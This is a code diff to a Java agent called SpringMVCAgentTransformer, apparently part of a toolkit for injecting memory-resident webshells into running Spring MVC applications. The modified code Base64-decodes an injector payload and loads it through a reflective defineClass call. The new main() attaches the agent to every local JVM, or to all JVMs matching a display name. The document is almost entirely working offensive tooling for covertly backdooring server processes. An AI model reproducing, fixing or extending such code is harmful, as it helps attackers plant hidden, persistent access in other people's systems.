@@ -17,6 +17,7 @@ import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.security.ProtectionDomain;
+import java.util.ArrayList;
 import java.util.List;
 
 public class SpringMVCAgentTransformer implements ClassFileTransformer {
@@ -59,7 +60,7 @@ public class SpringMVCAgentTransformer implements ClassFileTransformer {
                         "            } catch (Throwable e) {\n" +
                         "                Class base64Clazz = Class.forName(\"java.util.Base64\");\n" +
                         "                Object decoder = base64Clazz.getMethod(\"getDecoder\", null).invoke(base64Clazz, null);\n" +
-                        "                byteArray = (byte[]) base64Clazz.getMethod(\"decode\", new Class[]{byte[].class}).invoke(decoder, new Object[]{injectorCode});\n" +
+                        "                byteArray = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{injectorCode});\n" +
                         "            }\n" +
                         "            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());\n" +
                         "            java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
@@ -132,22 +133,45 @@ public class SpringMVCAgentTransformer implements ClassFileTransformer {
 
     }
 
+    /*
+        参数说明见 TomcatAgentTransformer
+     */
     public static void main(String[] args) throws Exception {
-        String jvmProcessId = null;
         if (args.length == 0) {
-            // 列出所有 pid
             listAllJvmPids();
-        } else {
-            try {
-                Integer.parseInt(args[0]);
-                jvmProcessId = args[0];
-                attachAgentToTargetJvm(jvmProcessId);
-            } catch (NumberFormatException e) {
-                throw new IllegalArgumentException("Argument must be an integer representing a JVM process ID");
+        }
+        else if (args.length == 1) {
+            String arg = args[0];
+            if (arg.equalsIgnoreCase("all")) {
+                for (String jvmProcessId : getAllJvmPids()) {
+                    attachAgentToTargetJvm(jvmProcessId);
+                }
             }
+            else {
+                try {
+                    Integer.parseInt(arg);
+                    attachAgentToTargetJvm(arg);
+                }
+                catch (NumberFormatException e) {
+                    for (String jvmProcessId : getJvmPidsByDisplayName(arg)) {
+                        attachAgentToTargetJvm(jvmProcessId);
+                    }
+                }
+            }
+        } else {
+            throw new IllegalArgumentException("Too many arguments. Expected none, 'all', a JVM process ID, or a displayName.");
         }
     }
 
+    public static List<String> getAllJvmPids() throws Exception {
+        List<String> pids = new ArrayList<>();
+        for (Object vm : vms) {
+            Method getId = virtualMachineDescriptorClass.getDeclaredMethod("id");
+            String id = (String) getId.invoke(vm);
+            pids.add(id);
+        }
+        return pids;
+    }
 
     public static void listAllJvmPids() throws Exception {
         for (Object vm : vms) {
@@ -157,6 +181,23 @@ public class SpringMVCAgentTransformer implements ClassFileTransformer {
             String id = (String) getId.invoke(vm);
             infoLog(String.format("Found pid %s ——> [%s]", id, displayName));
         }
+    }
+
+    public static List<String> getJvmPidsByDisplayName(String displayName) throws Exception {
+        List<String> pids = new ArrayList<>();
+        for (Object vm : vms) {
+            Method displayNameMethod = virtualMachineDescriptorClass.getMethod("displayName");
+            String currentDisplayName = (String) displayNameMethod.invoke(vm);
+            System.out.println(currentDisplayName);
+            System.out.println(displayName);
+            System.out.println();
+            if (currentDisplayName.toLowerCase().contains(displayName.toLowerCase())) {
+                Method getId = virtualMachineDescriptorClass.getDeclaredMethod("id");
+                String id = (String) getId.invoke(vm);
+                pids.add(id);
+            }
+        }
+        return pids;
     }
 
     private static void attachAgentToTargetJvm(String targetPID) throws Exception {
